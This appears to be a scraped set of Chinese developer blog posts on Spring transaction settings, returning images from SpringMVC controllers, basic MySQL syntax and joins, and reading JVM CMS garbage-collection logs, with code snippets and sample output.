String[] rollbackForClassName() default {}; Class&lt;? extends Throwable&gt;[] noRollbackFor() default {}; String[] noRollbackForClassName() default {};} 对应的属性说明 属性 类型 描述 value String 可选的限定描述符，指定使用的事务管理器 propagation enum Propagation 可选的事务传播行为设置 isolation enum Isolation 可选的事务隔离级别设置 readOnly boolean 读写或只读事务，默认读写 timeout int (in seconds granularity) 事务超时时间设置 rollbackFor Class对象数组，必须继承自Throwable 导致事务回滚的异常类数组 rollbackForClassName 类名数组 导致事务回滚的异常类名字数组 noRollbackFor Class对象数组，必须继承自Throwable 不会导致事务回滚的异常类数组 noRollbackForClassName 类名数组 不会导致事务回滚的异常类名字数组 上面的几个参数中，除了propagatin和isolation两个参数外，其次就是对readOnly的使用场景不太清晰外，其他的相对而言就没什么二义性了 timeout: 避免事务一致挂住，导致持有的锁不会释放（极端情况下死锁时，如果没有超时，系统就会拖挂） rollbackForXXX: 表示导致事务回滚的异常类 noRollbackForXXX: 某些情况下，我不希望某些异常引起事务回滚，就可以通过这个设置特例了 2. Propagation 事务传播行为事务传播行为：指在开始当前事务之前，已经有一个事务上下文存在了，此时可以怎么确定这个事务性方法的执行行为 举个例子简单说明这个场景 ServiceA 有个事务方法 methodA ServiceB 有个事务方法 methodB ServiceA的methodA方法内部调用ServiceB的methodB方法 这种时候methodB方法的执行时，是在methodA方法的事务中还是新启一个自己的事务呢？ a. 行为定义 TransactionDefinition.PROPAGATION_REQUIRED：如果当前事务存在，则加入该事务；如果不存在，则新建一个 TransactionDefinition.PROPAGATION_REQUIRES_NEW：创建一个新的事务，并挂起当前的事务（如果当前有一个事务的情况下） TransactionDefinition.PROPAGATION_SUPPORTS：如果当前事务存在，则加入，如果不存在，则以非事务方式运行 TransactionDefinition.PROPAGATION_NOT_SUPPORTED：非事务方式运行，如果当前事务存在，则挂起 TransactionDefinition.PROPAGATION_NEVER：非事务方式运行，如果当前事务存在，则抛异常 TransactionDefinition.PROPAGATION_MANDATORY：如果当前事务存在，则加入该事务，如果不存在，则抛异常 TransactionDefinition.PROPAGATION_NESTED：如果事务存在，则创建新的事务作为当前事务的嵌套，两者一起提交，外面的回滚，则内部的也回滚；如果没有事务，则等同于PROPAGATION_REQUIRED b. 简单说明默认的是 PROPAGATION_REQUIRED, 将当前执行加入到当前的事务中运行，这个主要和我们绝大部分的场景比较相似，同样为了代码逻辑的简单性而言，尽量避免多个事务方法交叉调用比较好 对于PROPAGATION_REQUIRES_NEW就比较有意思了，什么场景需要又开启一个事务来执行呢? 举一个不太恰当的例子： 在一个论坛的回帖，有这么个功能，注册和回帖一起提交，任务拆解为 回帖 + 积分+1 （假设这两个操作是一个事务） 注册 + 活跃度+1 （加色这两个操作是一个事务） 如果这个注册并回帖的实现逻辑如下: 进入回帖事务，准备插入回帖内容到DB中 首先判断用户是否存在，没有存在，则直接进入注册逻辑 注册逻辑开启新的事务，内部实现注册，实现活跃度+1两个功能，事务提交 回到回帖逻辑，执行回帖，执行积分+1，提交事务 上面这个过程，回帖开启了一个事务A；然后发现需要注册用户信息，然后进入注册逻辑，开启另一个事务B；此时我们希望的是注册独立于回帖，即便回帖失败（如回帖内容包含敏感词导致失败时）用户依然是注册成功；这种场景下PROPAGATION_REQUIRES_NEW 这个就有用了 另外一个就是TransactionDefinition.PROPAGATION_NESTED, 区别于PROPAGATION_REQUIRES_NEW, 这种属性下，内部的事务成功与否是依赖外部事务的，即外部的成功提交之后，内部才会提交 3. isolation 隔离级别学习DB时，也会见识隔离级别，比如mysql的InnoDB引擎中常见的 RU, RC, RR, Serializable四种隔离级别 主要就是针对多个事务之间的相互影响来说明的，隔离级别逐渐递增，更多关于db的隔离相关推荐参考 ：《mysql之锁与事务详解》 a. 事务隔离级别 TransactionDefinition.ISOLATION_DEFAULT：默认值，根据DB的事务隔离级别而言，mysql的InnoDB引擎是RR TransactionDefinition.ISOLATION_READ_UNCOMMITTED：表示一个事务在执行过程中，可以读取到其他事务未提交的内容（如另一个事务回滚时，可能出现脏读）基本不用 TransactionDefinition.ISOLATION_READ_COMMITTED：一个事务只能读取其他事务提交后的数据 （不可重复读，如第一次查询返回一个数据; 另一个事务更新了这个数据并提交，然后再次查询，返回了修改后的数据，导致两次结果不同，这就是不可重复读） TransactionDefinition.ISOLATION_REPEATABLE_READ：一个事务在整个过程中可以多次重复执行某个查询，并且每次返回的记录都相同。该级别可以防止脏读和不可重复读 TransactionDefinition.ISOLATION_SERIALIZABLE：所有事务逐次运行，效率最低，也不实用 最常见的隔离级别就是RC和RR 4. readony 只读属性读事务用于客户代码只读但不修改数据的情形，只读事务用于特定情景下的优化 只读事务”并不是一个强制选项，它只是一个“暗示”，提示数据库驱动程序和数据库系统，这个事务并不包含更改数据的操作，那么JDBC驱动程序和数据库就有可能根据这种情况对该事务进行一些特定的优化，比方说不安排相应的数据库锁，以减轻事务对数据库的压力，毕竟事务也是要消耗数据库的资源的。 但是你非要在“只读事务”里面修改数据，也并非不可以，只不过对于数据一致性的保护不像“读写事务”那样保险而已。 因此，“只读事务”仅仅是一个性能优化的推荐配置而已，并非强制你要这样做不可 II. Spring事务配置通过Spring中实际实用事务，以及对事务使用中的几个参数进行说明，对Spring中的事务使用有了那么点概念，接下在则根据自己的理解简单的串一下，整个过程是怎么玩的 DataSource：数据源，负责配置DB相关信息 TransactionManager: 事务管理器，用户事务配置 代理机制：具体的事务实现方式 前面两个的变动较少，主要就是代理机制的选择上，通常使用xml配置 tx:advice + aop:config 和 @Transactional + &lt;tx:annotation-driven transaction-manager=&quot;transactionManager&quot;/&gt; 两种方式 III. 其他1. 推荐博文 《Spring学习之事务的使用姿势》 《mysql之锁与事务详解》 《spring事务配置，声明式事务管理和基于@Transactional注解的使用》 工程源码 项目源码：study-demo 主要查看包路径： 事务demo 测试相关代码： 测试demo 2. 个人博客： 一灰灰Blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 3. 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 4. 扫描关注","link":"/hexblog/2018/05/13/Spring学习之事务管理与传播属性/"},{"title":"SpringMVC返回图片的几种方式","text":"SpringMVC返回图片的几种方式 后端提供服务，通常返回的json串，但是某些场景下可能需要直接返回二进制流，如一个图片编辑接口，希望直接将图片流返回给前端；如果要求返回base64，此时可以怎么处理？ I. 返回二进制图片主要借助的是 HttpServletResponse这个对象，实现case如下 1234567891011121314@RequestMapping(value = {\"/img/render\"}, method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.OPTIONS})@CrossOrigin(origins = \"*\")@ResponseBodypublic String execute(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) { // img为图片的二进制流 byte[] img = xxx; httpServletResponse.setContentType(\"image/png\"); OutputStream os = httpServletResponse.getOutputStream(); os.write(img); os.flush(); os.close(); return \"success\";} 注意事项 注意ContentType定义了图片类型 将二进制写入 httpServletResponse#getOutputStream 写完之后，flush(), close()请务必执行一次 II. 返回图片的几种方式封装一般来说，一个后端提供的服务接口，往往是返回json数据的居多，前面提到了直接返回图片的场景，那么常见的返回图片有哪些方式呢？ 返回图片的http地址 返回base64格式的图片 直接返回二进制的图片 其他…（我就见过上面三种，别的还真不知道） 那么我们提供的一个Controller，应该如何同时支持上面这三种使用姿势呢？ 1. bean定义因为有几种不同的返回方式，至于该选择哪一个，当然是由前端来指定了，所以，可以定义一个请求参数的bean对象 123456789101112131415161718192021222324252627282930@Datapublic class BaseRequest { private static final long serialVersionUID = 1146303518394712013L; /** * 输出图片方式: * * url : http地址 （默认方式） * base64 : base64编码 * stream : 直接返回图片 * */ private String outType; /** * 返回图片的类型 * jpg | png | webp | gif */ private String mediaType; public ReturnTypeEnum returnType() { return ReturnTypeEnum.getEnum(outType); } public MediaTypeEnum mediaType() { return MediaTypeEnum.getEnum(mediaType); }} 为了简化判断，定义了两个注解，一个ReturnTypeEnum, 一个 MediaTypeEnum， 当然必要性不是特别大，下面是两者的定义 12345678910111213141516171819202122232425262728293031public enum ReturnTypeEnum { URL(\"url\"), STREAM(\"stream\"), BASE64(\"base\"); private String type; ReturnTypeEnum(String type) { this.type = type; } private static Map&lt;String, ReturnTypeEnum&gt; map; static { map = new HashMap&lt;&gt;(3); for(ReturnTypeEnum e: ReturnTypeEnum.values()) { map.put(e.type, e); } } public static ReturnTypeEnum getEnum(String type) { if (type == null) { return URL; } ReturnTypeEnum e = map.get(type.toLowerCase()); return e == null ? URL : e; }} 12345678910111213141516171819202122232425262728293031323334353637@Datapublic enum MediaTypeEnum { ImageJpg(\"jpg\", \"image/jpeg\", \"FFD8FF\"), ImageGif(\"gif\", \"image/gif\", \"47494638\"), ImagePng(\"png\", \"image/png\", \"89504E47\"), ImageWebp(\"webp\", \"image/webp\", \"52494646\"), private final String ext; private final String mime; private final String magic; MediaTypeEnum(String ext, String mime, String magic) { this.ext = ext; this.mime = mime; this.magic = magic; } private static Map&lt;String, MediaTypeEnum&gt; map; static { map = new HashMap&lt;&gt;(4); for (MediaTypeEnum e: values()) { map.put(e.getExt(), e); } } public static MediaTypeEnum getEnum(String type) { if (type == null) { return ImageJpg; } MediaTypeEnum e = map.get(type.toLowerCase()); return e == null ? ImageJpg : e; }} 上面是请求参数封装的bean，返回当然也有一个对应的bean 1234567891011121314151617181920@Datapublic class BaseResponse { /** * 返回图片的相对路径 */ private String path; /** * 返回图片的https格式 */ private String url; /** * base64格式的图片 */ private String base;} 说明： 实际的项目环境中，请求参数和返回肯定不会像上面这么简单，所以可以通过继承上面的bean或者自己定义对应的格式来实现 2. 返回的封装方式既然目标明确，封装可算是这个里面最清晰的一个步骤了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758protected void buildResponse(BaseRequest request, BaseResponse response, byte[] bytes) throws SelfError { switch (request.returnType()) { case URL: upload(bytes, response); break; case BASE64: base64(bytes, response); break; case STREAM: stream(bytes, request); }}private void upload(byte[] bytes, BaseResponse response) throws SelfError { try { // 上传到图片服务器，根据各自的实际情况进行替换 String path = UploadUtil.upload(bytes); if (StringUtils.isBlank(path)) { // 上传失败 throw new InternalError(null); } response.setPath(path); response.setUrl(CdnUtil.img(path)); } catch (IOException e) { // cdn异常 log.error(\"upload to cdn error! e:{}\", e); throw new CDNUploadError(e.getMessage()); }}// 返回base64private void base64(byte[] bytes, BaseResponse response) { String base = Base64.getEncoder().encodeToString(bytes); response.setBase(base);}// 返回二进制图片private void stream(byte[] bytes, BaseRequest request) throws SelfError { try { MediaTypeEnum mediaType = request.mediaType(); HttpServletResponse servletResponse = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse(); servletResponse.setContentType(mediaType.getMime()); OutputStream os = servletResponse.getOutputStream(); os.write(bytes); os.flush(); os.close(); } catch (Exception e) { log.error(\"general return stream img error! req: {}, e:{}\", request, e); if (StringUtils.isNotBlank(e.getMessage())) { throw new InternalError(e.getMessage()); } else { throw new InternalError(null); } }} 说明： 请无视上面的几个自定义异常方式，需要使用时，完全可以干掉这些自定义异常即可；这里简单说一下，为什么会在实际项目中使用这种自定义异常的方式，主要是有以下几个优点 配合全局异常捕获(ControllerAdvie)，使用起来非常方便简单 所有的异常集中处理，方便信息统计和报警 1如，在统一的地方进行异常计数，然后超过某个阀值之后，报警给负责人，这样就不需要在每个出现异常case的地方来主动埋点了 避免错误状态码的层层传递 12- 这个主要针对web服务，一般是在返回的json串中，会包含对应的错误状态码，错误信息- 而异常case是可能出现在任何地方的，为了保持这个异常信息，要么将这些数据层层传递到controller；要么就是存在ThreadLocal中；显然这两种方式都没有抛异常的使用方便 有优点当然就有缺点了： 异常方式，额外的性能开销，所以在自定义异常中，我都覆盖了下面这个方法，不要完整的堆栈 1234@Overridepublic synchronized Throwable fillInStackTrace() { return this;} 编码习惯问题，有些人可能就非常不喜欢这种使用方式 III. 项目相关只说不练好像没什么意思，上面的这个设计，完全体现在了我一直维护的开源项目 Quick-Media中，当然实际和上面有一些不同，毕竟与业务相关较大，有兴趣的可以参考 QuickMedia: https://github.com/liuyueyi/quick-media : BaseAction: com.hust.hui.quickmedia.web.wxapi.WxBaseAction#buildReturn IV. 其他声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见解不全，如有问题，欢迎批评指正 扫描关注，java分享","link":"/hexblog/2018/01/18/SpringMVC返回图片的几种方式/"},{"title":"mysql基本语法学习小结","text":"本篇将主要集中在mysql的使用上，包括如何创建标，如何进行insert,update,select,delete，以及一些常见的sql中关键字的使用姿势 I. 数据库管理相关首先是从结构上知晓，一般的关系型数据库，先创建database(数据库), 然后可以在database中创建多个table(表) 通常，在业务稍微大一点的公司而言，不会把所有的数据都放在一个database中，相反会根据不同的业务，创建不同的database，然后在各自的database中维护自己的表，好处就是不会相互影响，后续扩容也方便 1. 创建database1create database test 2. 切换databasae1user test 3. 删除database1drop databse test 4. 显示所有数据库1show databases II. 表相关主要的操作都是针对表来的，因为数据就是挂在这个下面的 1. 创建表12345678910111213141516171819CREATE TABLE `newuser` ( `userId` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户id', `username` varchar(30) DEFAULT '' COMMENT '用户登录名', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '用户昵称', `password` varchar(50) DEFAULT '' COMMENT '用户登录密码 &amp; 密文根式', `address` text COMMENT '用户地址', `email` varchar(50) NOT NULL DEFAULT '' COMMENT '用户邮箱', `phone` bigint(20) NOT NULL DEFAULT '0' COMMENT '用户手机号', `img` varchar(100) DEFAULT '' COMMENT '用户头像', `extra` text, `isDeleted` tinyint(1) unsigned NOT NULL DEFAULT '0', `created` int(11) NOT NULL, `updated` int(11) NOT NULL, PRIMARY KEY (`userId`), KEY `idx_username` (`username`), KEY `idx_nickname` (`nickname`), KEY `idx_email` (`email`), KEY `idx_phone` (`phone`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='自定义表' 创建表的规则还是比较简单的，一般语法是： 123456create table tableName( 列名 + 列类型 + NOT NULL(可选，表示这个字段不能为空) + DEFAULT '' (可选，表示默认填充的数据) + COMMENT (后面加上这一列的注释), ... PRIMARY KEY (`id`), // 这个指定主键 KEY `idx_firstId` (`name`) // 这个是指定索引) ENGINE=InnoDB (指定存储引擎) AUTO_INCREMENT=1 （自增开始值） DEFAULT CHARSET=utf8 （默认编码） COMMENT='自定义表'; 需要注意一点，一个表的设计时，最好不要让某一列可以为null，而且良好的习惯是加上DEFALUT默认值，加上列的注释（特别是type的取值固定为1,2,3,4时，尽量在说明中写上每个值的含义） 2. 显示表信息如果我们是在控制台中来上mysql进行相关操作时，非常常见的一个命令就是如何查看表的数据结构，有几个命令 1desc table_name; 输出格式如下: 1234567891011121314151617+-----------+---------------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+-----------+---------------------+------+-----+---------+----------------+| userId | bigint(20) | NO | PRI | NULL | auto_increment || username | varchar(30) | YES | MUL | | || nickname | varchar(30) | NO | MUL | | || password | varchar(50) | YES | | | || address | text | YES | | NULL | || email | varchar(50) | NO | MUL | | || phone | bigint(20) | NO | MUL | 0 | || img | varchar(100) | YES | | | || extra | text | YES | | NULL | || isDeleted | tinyint(1) unsigned | NO | | 0 | || created | int(11) | NO | | NULL | || updated | int(11) | NO | | NULL | |+-----------+---------------------+------+-----+---------+----------------+12 rows in set (0.00 sec) 如果我希望获取这个表的建表语句，方便直接创建表，也可以用下面的命令 1show create table tableName\\G 输出如下 12345678910111213141516171819202122*************************** 1. row *************************** Table: newuserCreate Table: CREATE TABLE `newuser` ( `userId` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '用户id', `username` varchar(30) DEFAULT '' COMMENT '用户登录名', `nickname` varchar(30) NOT NULL DEFAULT '' COMMENT '用户昵称', `password` varchar(50) DEFAULT '' COMMENT '用户登录密码 &amp; 密文根式', `address` text COMMENT '用户地址', `email` varchar(50) NOT NULL DEFAULT '' COMMENT '用户邮箱', `phone` bigint(20) NOT NULL DEFAULT '0' COMMENT '用户手机号', `img` varchar(100) DEFAULT '' COMMENT '用户头像', `extra` text, `isDeleted` tinyint(1) unsigned NOT NULL DEFAULT '0', `created` int(11) NOT NULL, `updated` int(11) NOT NULL, PRIMARY KEY (`userId`), KEY `idx_username` (`username`), KEY `idx_nickname` (`nickname`), KEY `idx_email` (`email`), KEY `idx_phone` (`phone`)) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf81 row in set (0.00 sec) 3. 修改表重命名表名 1rename table `oldTableName` to `newTableName` 新加字段 12-- 修改类型alter table newuser add newcol varchar(10) not null default '' comment '新加的列'; 修改列 123456-- 修改类型alter table newuser modify newcol text not null;-- 修改名alter table newuser change `newcol` `newcol2` text; 删除列 1alter table newuser drop newcol2; 删除表 1drop table newuser; 4. 增删改查对DB的操作，基本上就四种了，增删改查，甚至绝大多数的业务都可以用简单的db的增删改查来实现 a. 插入一条数据1234-- insert into table_name(`列名`, `列名`) values('插入值', '插入值');insert into newuser(`username`, `nickname`, `password`, `address`, `email`, `phone`, `img`, `extra`, `isDeleted`, `created`, `updated`) values('insert', 'insert', 'insert', 'test', 'test@test.com', 123, 'img', '', 0, 1521638764, 1521638764); b. 查询数据select用于查询，先给出一个最基本的，下面再详细说明 1select * from newuser where username='insert' limit 1; 上面表示查询 username为insert的记录，输出结果(也就是刚才插入的那一条数据) 12345+--------+----------+----------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+| userId | username | nickname | password | address | email | phone | img | extra | isDeleted | created | updated |+--------+----------+----------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+| 3 | insert | insert | insert | test | test@test.com | 123 | img | | 0 | 1521638764 | 1521638764 |+--------+----------+----------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+ c. 修改数据将之前插入的记录中，nickname 修改成 ‘newNickName’, 借助 update set 语法实现 12345update newuser set nickname='newNickName' where userId=3;-- 再次查询验证select * from newuser where username='insert' limit 1; 输出结果 12345+--------+----------+-------------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+| userId | username | nickname | password | address | email | phone | img | extra | isDeleted | created | updated |+--------+----------+-------------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+| 3 | insert | newNickName | insert | test | test@test.com | 123 | img | | 0 | 1521638764 | 1521638764 |+--------+----------+-------------+----------+---------+---------------+-------+------+-------+-----------+------------+------------+ d. 将刚才的数据删掉说明，在实际的生产环境中，一般很少物理删除（即执行delete将记录彻底抹掉），更多的是采用逻辑删除的方案（至少还有恢复的可能，而且数据都是宝贵的，虽然大部分时候我们都没有去挖掘，但保存着总比丢掉好） 物理删除的语法比较简单，但是需要额外小心，一不小心删错了，说不准就得卷铺盖滚蛋了 1234567delete from newuser where userId=3 limit 1;-- 再次查询验证select * from newuser where username='insert' limit 1;-- 输出： Empty set (0.00 sec) III. 玩出花的查询语句1. 基本查询写sql而言，最常见的，也是最复杂的就是写各种查询了，根据各种不同的条件查询检索结果，大概可以区分以下几种 简单查询：知道确切的检索条件 where xxx=xxx 相等的判断 where xxx&lt;&gt;xxx 不等的判断 where id in (xxx, xxx, xxx) 满足集合的判断 where xxx=xxx and yyy=yyy 条件同时满足 where xxx=xxx or yyy=yyy 条件满足一个即可 where id&gt;10 or id&lt;5 范围判断 &gt;, &lt;, &gt;=, &lt;= where name is null 判空 is null, =’’, 非空 is not null, &lt;&gt;’’ 模糊查询: like 语法， %:替代任意个字符 _:替代一个字符 如: select userId,username from newuser where username like '%灰%'; 输出: 123456+--------+-----------+| userId | username |+--------+-----------+| 1 | 大灰狼 || 2 | 小灰灰 |+--------+-----------+ 条件限制 where 1=1 limit 10; 限制最多查询出来的条数 where 1=1 limit 1, 2; 分页查询 group by username; 分组 order by userId desc; 排序： desc倒排，asc 正排 select distinct(nickname) from xxx; 去重 having count(*) &gt; 2; 分组之后再筛选 执行计算 update phone=phone+1 limit 1; 直接实现数值计算 count(*) 统计总数 sum() 统计和 max() 最大值 min() 最小值 avg() 平均值 常用函数 abs() 返回绝对值 bin() 返回二进制 oct() 返回八进制， hex() 返回十六进制 exp() 返回e的n次方 greatest(x1, x2... xn) least(x1, x2, ...n) 返回最大最小 ln(x) 返回x的自然对数 log(x, y) mod(x, y) 返回x%y的模（余数） rand() 返回0-1内的随机值 floor(x) 反后小于x的最大整数 ceiling(x) 返回大于x的最小整数 round(x, y) 返回x的四舍五入的有y位小数的值 turncate(x,y) 截断为y位小数 sign(x) sqrt(x) 平方根 concat(s1, s2...) 字符串拼接 left(str, x) str的左x个字符 right(str, x) length(str) 返回字符串的长度 trim(str) 去掉空格 from_unixtime 将时间戳转日期 更多参考：MySQL常用函数 123456789select username,from_unixtime(created) from newuser limit 1;--- 下面为输出-- +-----------+------------------------+-- | username | from_unixtime(created) |-- +-----------+------------------------+-- | 大灰狼 | 2016-09-25 00:00:00 |-- +-----------+------------------------+ 2. 跨表查询当设计到查询多张表的结果时，往往是比较麻烦的 简单的多表查询方式 1select col1, col2 from table1, table2 where table1.col1 = table2.col2 limit 10; 主要就是利用两个表中的关联的列进行联合查询，也就是说，当查询涉及到多表时，那么这些表肯定是有沟通的桥梁的（一般是某一张表的主键是另一张表的某一列） 举个小例子，查询商品评价数为1的商品（假设评价是一张表，商品也是一张表），那么关联的主键就是商品ID了 如果是分开查询，那么应该是 1234567-- 查询出评价总数为1的10条评价select * from Rate group by itemId having count(*) =1 limit 10;-- 查询对应的商品信息, 上面的结果就是下面()中的内容select * from Item where itemId in (xxx, xxx); 那么换成一条sql，可以怎么写？ 简单的嵌套方案：（有点像是硬把多条语句写成一条） 12select * from Item where itemId in (select itemId from Rate group by itemId having count(*)=1 limit 10); 一般多表查询可划分为: a.交叉连接查询需求:查询员工及其部门名称 123SELECT employee.name,dept.nameFROM employee,dept; b.内连接查询(使用最多)多表查询的步骤: 1)确定查询哪些表2)确定查询哪些字段3)确定连接条件(规则:条件=表数量-1) 123SELECT employee.name,dept.nameFROM employee,deptWHERE employee.deptId=dept.id; 另一种语法 1234SELECT e.name,d.name FROM employee e INNER JOIN dept d ON e.deptId=d.id; c.左外连接查询(左表数据全部显示，如果右边不满足，则显示null)需求:查询部门及其部门的员工 1234SELECT d.name,e.name FROM dept d LEFT OUTER JOIN employee e ON d.id=e.deptId; d.右外连接查询(右表数据全部显示，如果左边不满足，则显示null)1234SELECT d.name,e.nameFROM employee eRIGHT OUTER JOIN dept dON e.deptId=d.id; IV. 其他个人博客： Z+|blog基于hexo + github pages搭建的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 声明尽信书则不如，已上内容，纯属一家之言，因本人能力一般，见识有限，如发现bug或者有更好的建议，随时欢迎批评指正 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 扫描关注","link":"/hexblog/2018/03/22/mysql基本语法学习小结/"},{"title":"jvm调优的工具介绍","text":"jvm调优实战笔记之基础知识简介I. 背景 java后端，提供了一个svg渲染的服务，在qps较大时，会出现频繁的gc，而此时的服务器性能本身并没有达到瓶颈（cpu,load,io都不太高）因此考虑调整一下jvm的相关参数，看是否可以提升服务性能 jvm相关参数记录 12-XX:+CMSClassUnloadingEnabled -XX:CMSInitiatingOccupancyFraction=80 -XX:CMSMaxAbortablePrecleanTime=5000 -XX:+CMSParallelRemarkEnabled -XX:+CMSScavengeBeforeRemark -XX:+ExplicitGCInvokesConcurrent -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/xxx/java.hprof -XX:InitialCodeCacheSize=134217728 -XX:InitialHeapSize=4294967296 -XX:MaxDirectMemorySize=1073741824 -XX:MaxHeapSize=4294967296 -XX:MaxMetaspaceSize=268435456 -XX:MaxNewSize=2147483648 -XX:MetaspaceSize=268435456 -XX:NewSize=2147483648 -XX:OldPLABSize=16 -XX:+PrintGC -XX:+PrintGCDateStamps -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:ReservedCodeCacheSize=268435456 -XX:SurvivorRatio=10 -XX:+UseCMSCompactAtFullCollection -XX:+UseCMSInitiatingOccupancyOnly -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseConcMarkSweepGC -XX:+UseParNewGC 2. 监控工具使用tsar作为服务器性能监控工具，所以前提是先安装tsar 12345wget -O tsar.zip https://github.com/alibaba/tsar/archive/master.zip --no-check-certificateunzip tsar.zipcd tsarmakemake install 监控命令 1tsar --cpu --swap -i1 -l 说明 tsar相关可以参考： Linux系统性能监控工具介绍之-tsar II. 相关知识点简介截取几条gc日志 1234562018-01-02T10:49:20.390+0800: 9.015: [GC (Allocation Failure) 2018-01-02T10:49:20.390+0800: 9.015: [ParNew: 1922431K-&gt;134118K(1922432K), 0.1486593 secs] 1934749K-&gt;201350K(4019584K), 0.1487460 secs] [Times: user=0.33 sys=0.05, real=0.14 secs]2018-01-02T10:49:25.374+0800: 13.999: [GC (Allocation Failure) 2018-01-02T10:49:25.374+0800: 13.999: [ParNew: 1881830K-&gt;93708K(1922432K), 0.0910714 secs] 1949062K-&gt;197949K(4019584K), 0.0911833 secs] [Times: user=0.26 sys=0.01, real=0.09 secs]2018-01-02T10:55:53.013+0800: 401.639: [GC (GCLocker Initiated GC) 2018-01-02T10:55:53.013+0800: 401.639: [ParNew: 1841429K-&gt;142552K(1922432K), 0.0629031 secs] 1945670K-&gt;246793K(4019584K), 0.0630512 secs] [Times: user=0.14 sys=0.01, real=0.06 secs]2018-01-02T10:55:55.076+0800: 403.701: [GC (GCLocker Initiated GC) 2018-01-02T10:55:55.076+0800: 403.701: [ParNew: 1890281K-&gt;59983K(1922432K), 0.0661778 secs] 1994522K-&gt;201875K(4019584K), 0.0663176 secs] [Times: user=0.15 sys=0.01, real=0.07 secs]2018-01-02T11:47:25.271+0800: 3493.897: [GC (Allocation Failure) 2018-01-02T11:47:25.271+0800: 3493.897: [ParNew: 1807695K-&gt;20975K(1922432K), 0.0193077 secs] 1949587K-&gt;162867K(4019584K), 0.0195351 secs] [Times: user=0.04 sys=0.00, real=0.02 secs]2018-01-02T11:56:50.621+0800: 4059.247: [GC (GCLocker Initiated GC) 2018-01-02T11:56:50.622+0800: 4059.247: [ParNew: 1774543K-&gt;108899K(1922432K), 0.0401606 secs] 1916434K-&gt;250791K(4019584K), 0.0403586 secs] [Times: user=0.10 sys=0.00, real=0.04 secs] 1. CMS GC日志格式分析截取上面日志中的第一条，分别说明每一项是什么意思 2018-01-02T10:49:20.390+0800: 9.015: [GC (Allocation Failure) 2018-01-02T10:49:20.390+0800: 9.015: [ParNew: 1922431K-&gt;134118K(1922432K), 0.1486593 secs] 1934749K-&gt;201350K(4019584K), 0.1487460 secs] [Times: user=0.33 sys=0.05, real=0.14 secs] 2018-01-02T10:49:20.390+0800 ：发生gc的时间 9.015 - GC开始，相对JVM启动的相对时间，单位是秒 GC - 区别FullGC和MinorGC的标识，此处表示为MinorGC (Allocation Failure) - 发生gc的原因，此处表示空间不足，导致分配失败 ParNew – 收集器的名称，它预示了年轻代使用一个并行的 mark-copy stop-the-world 垃圾收集器 1922431K-&gt;134118K – 收集前后年轻代的使用情况，未回收之前，大小为1922431K, 回收完毕之后，大小为134118K, 所以回收大小为: 1922431K - 134118K (1922432K) - 整个年轻代的容量 0.1486593 secs - 这个解释用原滋原味的解释：Duration for the collection w/o final cleanup. 1934749K-&gt;201350K - 收集前后整个堆的使用情况 (4019584K) - 整个堆的容量 0.1487460 secs – ParNew收集器标记和复制年轻代活着的对象所花费的时间（包括和老年代通信的开销、对象晋升到老年代时间、垃圾收集周期结束一些最后的清理对象等的花销）； [Times: user=0.78 sys=0.01, real=0.11 secs] – GC事件在不同维度的耗时，具体的用英文解释起来更加合理: user – Total CPU time that was consumed by Garbage Collector threads during this collection sys – Time spent in OS calls or waiting for system event real – Clock time for which your application was stopped. With Parallel GC this number should be close to (user time + system time) divided by the number of threads used by the Garbage Collector. In this particular case 8 threads were used. Note that due to some activities not being parallelizable, it always exceeds the ratio by a certain amount. 2. CMS简介 后端服务选用的就是CMS，那么就有必要看一下这个CMS到底是个什么东西 CMSConcurrent Mark Sweep 收集器，是一种以获取最短回收停顿时间为目标的收集器，核心就是标签-清除算法 步骤划分 初始标记 (CMS initial mark) : 标记GC Roots能直接关联到的对象，速度很快，会暂停 并发标记 (CMS concurrent mark) : 进行 GC Roots Tracing的过程 重新标记 (CMS remark) : 为了修正并发标记期间，因为程序继续运作导致标记变动的那一部分对象的标记记录，一般会长于初始标记时间，远小于并发标记的时间 并发清除 (CMS concurrent sweep) : 说明，初始标记和重新标记的时候，会暂停服务；后面两个则是并发修改 标记清除算法一句话描述： 标记所有需要回收的对象，在标记完成后，统一回收所有被标记的对象 常见的两个问题： 效率不高；回收后大量的碎片 3. 内存分配和回收策略a. 对象优先在Eden分配大多数场景下，对象在新生代Eden区分配，当Eden去没有足够的空间进行分配时，虚拟机发起一次 Minor GC 新生代MinorGC ： 发生在新生代的垃圾收集动作，因为java对象大多都具备朝生夕灭的特性是，所以一般MinorGC非常频繁，一般回收速度也很快 老年代MajorGC(FullGC) : 发生在老年代的GC，通常就伴随至少一次的MinorGC（非绝对），一般较慢，是MinorGC的十倍以上 b. 大对象直接进入老年代需要大量连续内存空间的Java对象，通常是数组，同构 -XX:PretenuresizeThreshold 参数，来设置大对象的阀值，超过这个阀值的直接分配在年老代，避免在Eden区及两个Survivor区指尖发生大量的内存复制 c. 长期存活的对象将进入老年代既然虚拟机采用分代收集的思想来管理内存，在回收时，就必须能识别哪些对象应放在新生代，那些对象应放在老年代中 每个对象都有个Age的计数器，对象在Eden出生并经过第一次MinorGC后仍存在，且可以被Survivor容纳的话，会被移动到Survivor空间中，并设置Age为1 